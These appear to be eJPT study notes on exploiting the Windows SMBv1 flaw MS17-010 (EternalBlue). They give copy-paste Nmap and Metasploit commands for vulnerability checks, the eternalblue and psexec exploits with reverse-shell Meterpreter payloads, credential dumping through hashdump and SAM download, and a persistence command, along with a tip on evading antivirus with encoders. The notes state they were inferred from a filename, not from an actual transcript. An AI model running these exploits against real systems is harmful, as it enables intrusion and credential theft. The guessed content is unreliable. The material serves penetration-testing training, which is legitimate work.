# Exploiting Windows MS17-010 (EternalBlue) — eJPT Study Notes

Transcript note: No transcript was provided. The following summary is inferred from the filename and typical eJPT workflow for exploiting MS17-010 (CVE-2017-0144) in a Windows exploitation module. Commands and flags are conservative and lab-safe.

## What the video covers (Introduction / big picture)
- Identifying and exploiting the Microsoft SMBv1 remote code execution vulnerability MS17-010 (EternalBlue).
- Workflow from enumeration to verification to exploitation using Nmap and Metasploit.
- Gaining a Meterpreter session and basic post-exploitation on Windows 7/Server 2008 R2 targets.
- Reliability considerations, target architecture, and common pitfalls.

## Flow (ordered)
1. Discover SMB (TCP 445) and fingerprint the host/OS.
2. Check for MS17-010 vulnerability (Nmap NSE and/or Metasploit scanner).
3. Select appropriate Metasploit exploit (eternalblue or ms17_010_psexec).
4. Configure exploit options (RHOSTS, LHOST, payload, target).
5. Run `check`, then run exploit and obtain a session.
6. Stabilize and verify (sysinfo, getuid, migrate).
7. Basic post-exploitation (hashdump, file system, persistence optional).
8. Document findings and cleanup.

## Tools highlighted
- Nmap (service detection, OS fingerprinting, NSE smb-vuln-ms17-010).
- Metasploit Framework:
  - auxiliary/scanner/smb/smb_ms17_010 (vuln check)
  - exploit/windows/smb/ms17_010_eternalblue (x64 RCE)
  - exploit/windows/smb/ms17_010_psexec (reliable alternative)
  - windows/x64/meterpreter/reverse_tcp payload
- smbclient/smbmap (optional SMB enumeration)
- Basic Windows post-exploitation via Meterpreter

## Typical command walkthrough (detailed, copy-paste friendly)

Set target and attacker IPs for convenience:
```bash
export TARGET=10.10.10.10
export LHOST=10.10.14.5
```

1) Fast port check and SMB fingerprint
```bash
sudo nmap -Pn -p445 -sS -sV -O --reason --version-all $TARGET
sudo nmap -Pn -p139,445 --script smb-os-discovery,smb2-capabilities $TARGET
```

2) Check MS17-010 (try Nmap NSE; if not present, skip to Metasploit scanner)
```bash
# On many Kali images this NSE exists; if not, use Metasploit scanner below
sudo nmap -Pn -p445 --script smb-vuln-ms17-010 $TARGET
```

3) Metasploit scanner to confirm vulnerability
```bash
msfconsole -q
```
Inside msfconsole:
```text
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $TARGET
set THREADS 10
run
```
Look for “Host is likely VULNERABLE to MS17-010” and absence of “Not vulnerable”.

4) Exploit option A — EternalBlue (x64 targets: Windows 7/Server 2008 R2)
```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set RPORT 445
set LHOST $LHOST
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Optional safety checks
set VERIFY_ARCH true
set VERIFY_TARGET true
check
run
```

5) Exploit option B — ms17_010_psexec (often reliable, can work where eternalblue is finicky)
```text
use exploit/windows/smb/ms17_010_psexec
set RHOSTS $TARGET
set RPORT 445
set LHOST $LHOST
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
run
```

6) After getting a session (Meterpreter)
```text
sessions
sessions -i 1
sysinfo
getuid
# If not SYSTEM, try getsystem:
getsystem
# Migrate into a stable 64-bit process (e.g., services.exe/spoolsv.exe):
ps
migrate <pid_of_64bit_system_process>
```

7) Quick post-exploitation examples
```text
# Enumerate users and privileges
getprivs
hashdump
# File system
pwd
ls
download C:\\Windows\\System32\\config\\SAM
# Persistence (optional; only in authorized labs)
run persistence -X -i 5 -p 4444 -r $LHOST
```

8) Cleanup (if you set persistence or dropped files)
```text
# Remove persistence job if created, or revert snapshot in lab
```

Optional: SMB enumeration without creds
```bash
smbclient -L //$TARGET/ -N
smbmap -H $TARGET
```

## Practical tips
- Target architecture matters: exploit/windows/smb/ms17_010_eternalblue is x64-only. Use a 64-bit payload. If you only see x86 processes, migrate to a 64-bit one or use ms17_010_psexec.
- Reliability: EternalBlue can crash unpatched boxes (BSOD). Prefer running `check`, enable VERIFY_* options, and consider ms17_010_psexec for better stability.
- OS scope: Most reliable on Windows 7 SP1 and Windows Server 2008 R2 (pre-March 2017 patches). Windows 10/Server 2016 typically patched; don’t expect success.
- Firewalls/AV: Lab targets usually permissive. In real environments, AV may block payloads; use staged payloads and different encoders if needed.
- Common errors:
  - ECONNRESET/timeout: Check host is up, port 445 open, no IPS, correct RHOSTS.
  - “Unable to find a vulnerable host” after check: The target may be patched or not SMBv1.
  - Session dies immediately: Try a different payload or migrate quickly after session spawn.
- Enumeration first: Confirm 445 is open, identify OS and SMB dialect; look for Windows 7/2008 R2 signatures before attempting exploit.
- Use run -j to background long runs and sessions to manage multiple targets.
- Always have authorization; document exact commands, timestamps, and outcomes.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover SMB
sudo nmap -Pn -p445 -sV -O $TARGET

# 2) Vuln check (pick one)
sudo nmap -Pn -p445 --script smb-vuln-ms17-010 $TARGET
# or
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run; exit"

# 3) Exploit (EternalBlue x64)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $LHOST; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"

# Alt exploit (often reliable)
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOSTS $TARGET; set LHOST $LHOST; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"
```
Post-exploitation (Meterpreter):
```text
sessions -i 1
sysinfo
getuid
ps
migrate <pid>
hashdump
```

## Summary
- MS17-010 (EternalBlue, CVE-2017-0144) is an SMBv1 RCE affecting unpatched Windows 7/Server 2008 R2 primarily.
- Workflow: verify 445, confirm vulnerability (Nmap NSE or Metasploit scanner), exploit with ms17_010_eternalblue (x64) or ms17_010_psexec, then stabilize and enumerate.
- Key gotchas: target must be unpatched, x64 for eternalblue, potential for BSOD, and the importance of quick migration and verification.